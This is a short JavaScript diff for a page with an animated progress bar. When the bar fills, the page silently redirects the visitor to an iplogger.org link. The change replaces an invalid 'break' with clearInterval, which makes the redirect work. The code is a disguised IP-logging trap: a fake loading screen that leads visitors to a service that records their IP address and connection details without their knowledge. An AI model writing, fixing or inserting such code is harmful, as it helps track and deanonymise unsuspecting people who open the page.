@@ -7,6 +7,6 @@ var intervalId = window.setInterval(function() {
     progress.style.width = `${num}px`;
     if (num == 240) {
         window.open("https://iplogger.org/2AsRp6","_self");
-        break;
+        clearInterval(intervalId);
     }
 }, 50);
